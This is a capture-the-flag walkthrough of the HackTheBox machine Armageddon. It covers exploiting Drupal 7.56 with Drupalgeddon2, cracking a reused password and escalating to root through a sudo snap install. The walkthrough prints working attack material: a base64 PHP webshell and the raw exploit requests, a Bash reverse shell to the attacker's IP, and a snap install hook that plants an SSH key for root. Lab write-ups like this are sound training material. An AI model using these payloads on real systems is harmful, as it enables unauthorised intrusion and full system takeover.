---
title: HTB: Armageddon
url: https://0xdf.gitlab.io/2021/07/24/htb-armageddon.html
date: 2021-07-24T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, htb-armageddon, ctf, nmap, ubuntu, drupal, drupalgeddon2, searchsploit, webshell, upload, hashcat, mysql, sudo, snap, snapcraft, burp, oscp-like-v2
---

![Armageddon](https://0xdfimages.gitlab.io/img/armageddon-cover.png)

Argageddon was a box targeted at beginners. The foothold exploit, Drupalgeddon2 has many public exploit scripts that can be used to upload a webshell and run commands. I’ll get access to the database and get the admin’s hash, crack it, and find that password is reused on the host as well. To get root, I’ll abuse the admin’s ability to install snap packages as root.

## Box Info

| Name | [Armageddon](https://hackthebox.com/machines/armageddon)  [Armageddon](https://hackthebox.com/machines/armageddon) [Play on HackTheBox](https://hackthebox.com/machines/armageddon) |
| --- | --- |
| Release Date | [27 Mar 2021](https://twitter.com/hackthebox_eu/status/1417839437493506048) |
| Retire Date | 24 Jul 2021 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Armageddon |
| Radar Graph | Radar chart for Armageddon |
| First Blood User | 00:06:59[Caracal Caracal](https://app.hackthebox.com/users/219989) |
| First Blood Root | 00:27:17[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [bertolis bertolis](https://app.hackthebox.com/users/27897) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.233
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 06:49 EDT
Nmap scan report for 10.10.10.233
Host is up (0.091s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds

oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.233
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 06:50 EDT
Nmap scan report for 10.10.10.233
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.76 seconds

```

Based on the [Apache](https://access.redhat.com/solutions/445713) version, the host is likely running CentOS 7. The HTTP is hosting a Drupal 7 instance, and there’s a `robots.txt` file with a bunch of paths that I may want to check out in more detail.

### Website - TCP 80

#### Site

The site doesn’t have much content on it:

![image-20210326065540144](https://0xdfimages.gitlab.io/img/image-20210326065540144.png)

In the page source, the Drupal version is clear:

```

<meta name="Generator" content="Drupal 7 (http://drupal.org)" />

```

The `robots.txt` file looks exactly the same as the one on [Drupal’s GitHub](https://github.com/drupal/drupal/blob/7.x/robots.txt), so nothing interesting there. I did change the branch on GitHub to 7.X to get the code the was closest to the version on Armageddon to see that match.

I can try to create an account, but the process involves getting an email, which is typically not an option on HTB. I could try seeing if it will send to my IP, but the site throws errors that suggests it can’t send:

![image-20210326070019500](https://0xdfimages.gitlab.io/img/image-20210326070019500.png)

#### Version

In the Drupal [GitHub](https://github.com/drupal/drupal/tree/7.x), there’s a file at the root, `CHANGELOG.txt`. That file exists on Armageddon as well:

```

oxdf@parrot$ curl -s 10.10.10.233/CHANGELOG.txt | head

Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues (access bypass). See SA-CORE-2017-003.

Drupal 7.55, 2017-06-07
-----------------------
- Fixed incompatibility with PHP versions 7.0.19 and 7.1.5 due to duplicate
  DATE_RFC7231 definition.
- Made Drupal core pass all automated tests on PHP 7.1.

```

This gives the exact version, 7.56.

#### Exploits

`serachsploit` shows a bunch of Drupal exploits (snipped out ones for non-7 versions):

```

oxdf@parrot$ searchsploit drupal 7
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
...[snip]...
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)      | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)       | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Executio | php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                 | php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                     | php/webapps/41564.php
...[snip]...
Drupal < 7.34 - Denial of Service                                      | php/dos/35415.txt
Drupal < 7.34 - Denial of Service                                      | php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploi | php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution  | php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution         | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                     | php/webapps/46459.py
...[snip]...
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

There’s clearly a lot here. Drupalgeddon 2 and 3 both look like candidates.

## Shell as apache

### RCE - Drupalgeddon2

Given the number of exploits and the fact that the quality in `searchsploit` can be a bit all over the map, I went to Google, and found [this repo](https://github.com/dreadlocked/Drupalgeddon2). I’ll look at exactly what it’s doing in Beyond Root, but the repo itself works great. Running it provides a prompt:

```

oxdf@parrot$ /opt/Drupalgeddon2/drupalgeddon2.rb http://10.10.10.233
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.233/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo SNQOQAOF
[+] Result : SNQOQAOF
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.233/shell.php)
[!] Response: HTTP 200 // Size: 6.   ***Something could already be there?***
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
armageddon.htb>> 

```

The prompt works like a shell:

```

armageddon.htb>> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0

```

The last line before the prompt suggests it just has a webshell running. It works too:

```

oxdf@parrot$ curl 'http://10.10.10.233/shell.php' -d 'c=id'
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0

```

### Shell

To get a shell, I triggered the same webshell with a Bash reverse shell:

```

oxdf@parrot$ curl -G --data-urlencode "c=bash -i >& /dev/tcp/10.10.14.7/443 0>&1" 'http://10.10.10.233/shell.php'

```

`curl` hangs, but at my listening `nc`:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.233] 36008
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0

```

I tried to do the shell upgrade, but it complains about being out of PTY devices:

```

bash-4.2$ python3 -c 'import pty;pty.spawn("bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/usr/lib64/python3.6/pty.py", line 154, in spawn
    pid, master_fd = fork()
  File "/usr/lib64/python3.6/pty.py", line 96, in fork
    master_fd, slave_fd = openpty()
  File "/usr/lib64/python3.6/pty.py", line 29, in openpty
    master_fd, slave_name = _open_terminal()
  File "/usr/lib64/python3.6/pty.py", line 59, in _open_terminal
    raise OSError('out of pty devices')
OSError: out of pty devices

```

I wasn’t able to find a way around that. I didn’t really need a PTY shell, but if I did, I would have tried uploading `socat` next.

## Shell as brucetherealadmin

### Enumeration

#### Users

Typically I go look at `/home` to see what other users are on the box and where I might want to pivot next. Interestingly, I can’t see anything in `/home`:

```

bash-4.2$ ls -l /home
ls -l /home
ls: cannot open directory /home: Permission denied

```

Looking at `/etc/passwd`, there’s one other account of interest, brucetherealadmin:

```

bash-4.2$ cat /etc/passwd | grep sh
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash

```

#### Drupal Config

apache doesn’t have access to much, so back into the web directory. There’s a `settings.php` file in `/var/www/html/sites/default`. It’s got DB creds:

```

$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

```

Everything else looks default.

#### Database

Because my shell is a not in a PTY, I’ll have to run DB commands from the command line. Drupal creates a bunch of tables:

```

bash-4.2$ mysql -e 'show tables;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
Tables_in_drupal
actions
authmap
batch
block
...[snip]...
users
users_roles
variable
watchdog

```

I’m immediately interested in `users`.

```

bash-4.2$ mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London              0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}

```

There’s a hash for brucetherealadmin.

### Hashcat

That hash matches the format for Drupal 7 on the [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes). Hashcat will crack it pretty quickly with `hashcat -m 7900 brucetherealadmin-hash /usr/share/wordlists/rockyou.txt` to find the password “booboo”.

### SSH

This password works for SSH access:

```

oxdf@parrot$ sshpass -p booboo ssh brucetherealadmin@10.10.10.233
Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.7
[brucetherealadmin@armageddon ~]$ 

```

And I can grab `user.txt`:

```

[brucetherealadmin@armageddon ~]$ cat user.txt
be57c4e6************************

```

## Shell as root

### Enumeration

brucetherealadmin can run snap installs as root:

```

[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *

```

### Malicious Snap Package

Googling for maliocus snap packages led me to an article from 2019 about [Dirty Sock](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html). This isn’t the vulnerability here, but they used a malicious snap package to exploit the Dirty Sock exploit, and I remember playing with Dirty Sock on HTB and writing [this post](/2019/02/13/playing-with-dirty-sock.html) about it.

There’s a section in the Dirty Sock post that walks through how to create a snap package:

![image-20210326151833655](https://0xdfimages.gitlab.io/img/image-20210326151833655.png)

I worked from an Ubuntu VM to make the snap, and just followed the instructions. Installed the tools:

```

sudo snap install --classic snapcraft

```

Now I’ll find a directory to work out of, and run `snapcraft init`. It creates a `snap` directory with `snapcraft.yaml` in it:

```

df@buntu:~$ cd /tmp/
df@buntu:/tmp$ mkdir dirty_snap
df@buntu:/tmp$ cd dirty_snap/
df@buntu:/tmp/dirty_snap$ snapcraft init
Created snap/snapcraft.yaml.
Go to https://docs.snapcraft.io/the-snapcraft-format/8337 for more information about the snapcraft.yaml format.

```

I’ll prep the install hook:

```

oxdf@parrot$ mkdir snap/hooks
oxdf@parrot$ touch snap/hooks/install
oxdf@parrot$ chmod a+x snap/hooks/install

```

The next step in the example they save to `install` a Bash script that creates a user and adds it to the `sudoers` group. I’ll have mine just write a public SSH key into the root `authorized_keys` file:

```

df@buntu:/tmp/dirty_snap$ cat > snap/hooks/install << "EOF"
#!/bin/bash

mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > /root/.ssh/authorized_keys
EOF

```

The next file, `snapcraft.yaml`, is just boilerplate. I’ll just use the example:

```

df@buntu:/tmp/dirty_snap$ cat > snap/snapcraft.yaml << "EOF"
name: armageddon
version: '0.1' 
summary: Empty snap, used for exploit
description: |
    pwn armageddon                              
       
grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
EOF

```

Now on running `snapcraft`, it creates the package:

```

df@buntu:/tmp/dirty_snap$ snapcraft
This snapcraft project does not specify the base keyword, explicitly setting the base keyword enables the latest snapcraft features.
This project is best built on 'Ubuntu 16.04', but is building on a 'Ubuntu 20.04' host.
Read more about bases at https://docs.snapcraft.io/t/base-snaps/11198
Pulling my-part 
Building my-part 
Staging my-part 
Priming my-part 
Snapping 'armageddon' |                                                                                      
Snapped armageddon_0.1_amd64.snap
df@buntu:/tmp/dirty_snap$ ls *.snap
armageddon_0.1_amd64.snap

```

### Transfer to Armageddon

I’ll start a Python HTTP server in the directory on my local box where the snap package is:

```

oxdf@parrot$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

Now from Armageddon, I’ll request it. `wget` isn’t installed, but `curl` is:

```

[brucetherealadmin@armageddon shm]$ curl 10.10.14.7/armageddon_0.1_amd64.snap -o armageddon_0.1_amd64.snap
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  4096  100  4096    0     0  21478      0 --:--:-- --:--:-- --:--:-- 21671

```

### Install Snap

To install the package, I’ll run the command with `sudo` and pass it the snap. It fails:

```

[brucetherealadmin@armageddon shm]$ sudo snap install armageddon_0.1_amd64.snap 
error: cannot find signatures with metadata for snap "armageddon_0.1_amd64.snap"

```

Some [Googling](https://askubuntu.com/questions/822765/snap-install-failure-error-cannot-find-signatures-with-metadata-for-snap) this error suggested adding `--dangerous`, which now gives a different error:

```

[brucetherealadmin@armageddon shm]$ sudo snap install --dangerous armageddon_0.1_amd64.snap 
error: snap "armageddon_0.1_amd64.snap" requires devmode or confinement override

```

Googling that leads to [posts](https://askubuntu.com/questions/783945/what-is-devmode-for-snaps) about `--devmode`, which works:

```

[brucetherealadmin@armageddon shm]$ sudo snap install --devmode armageddon_0.1_amd64.snap 
armageddon 0.1 installed

```

### SSH

If that install worked as I hope, my public key is now in `/root/.ssh/authorized_keys`, and I should be able to connect with SSH. It worked:

```

oxdf@parrot$ ssh -i ~/keys/ed25519_gen root@10.10.10.233
Last login: Fri Mar 19 07:56:39 2021
[root@armageddon ~]# 

```

And I can get the root flag:

```

[root@armageddon ~]# cat root.txt
a289b09c************************

```

## Beyond Root

To take a look at that Ruby script, I set a new listener in Burp that would listen on port 8888 and forward all traffic to 10.10.10.233 port 80:

![image-20210326161915166](https://0xdfimages.gitlab.io/img/image-20210326161915166.png)

Then I ran the exploit targeting `http://127.0.0.1:8888`:

```

oxdf@parrot$ /opt/Drupalgeddon2/drupalgeddon2.rb http://127.0.0.1:8888
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://127.0.0.1:8888/
--------------------------------------------------------------------------------
[+] Found  : http://127.0.0.1:8888/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo TRZZJAMZ
[+] Result : TRZZJAMZ
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://127.0.0.1:8888/shell.php)
[i] Response: HTTP 404 // Size: 5
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://127.0.0.1:8888/shell.php' -d 'c=hostname'
armageddon.htb>>

```

There are eight new requests in Burp:

![image-20210326163257806](https://0xdfimages.gitlab.io/img/image-20210326163257806.png)

The first thing it does is pull the `CHANGELOG.txt`, just like I did above. Then it tries a couple paths to this `/user/password` form, and gets 500 and 404. It goes back to the one that gave 500, and adds additional parameters:

```

POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20VQMJGJAU HTTP/1.1
User-Agent: drupalgeddon2
Connection: close
Host: 127.0.0.1:8888
Content-Length: 47
Content-Type: application/x-www-form-urlencoded

form_id=user_pass&_triggering_element_name=name

```

The `name[%23markup]` field is set to a command. I’m not going to dive too much deeper into the details of why this executes - [This post](https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/) from Checkpoint does a really nice job going into the details. But to see what the script does, it first sends the request above with the final bit being `echo VQMJGJAU`. This is just to verify that the exploit works. Then it tries to talk to the backdoor (presumably to see if it’s already uploaded). When that fails (404), it sends the next request:

```

POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20|%20base64%20-d%20|%20tee%20shell.php HTTP/1.1
User-Agent: drupalgeddon2
Connection: close
Host: 127.0.0.1:8888
Content-Length: 47
Content-Type: application/x-www-form-urlencoded

form_id=user_pass&_triggering_element_name=name

```

This time the command is:

```

echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php

```

The base64 string is pipped into `base64` to decode it and then `tee` will output it to the paste *and* write it to `shell.php`.

The command decodes to a PHP webshell:

```

<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }

```

Now there’s a request to `shell.php` which is successful (running the `hostname` command to set up the prompt), and now it’s left to the user to issue additional commands.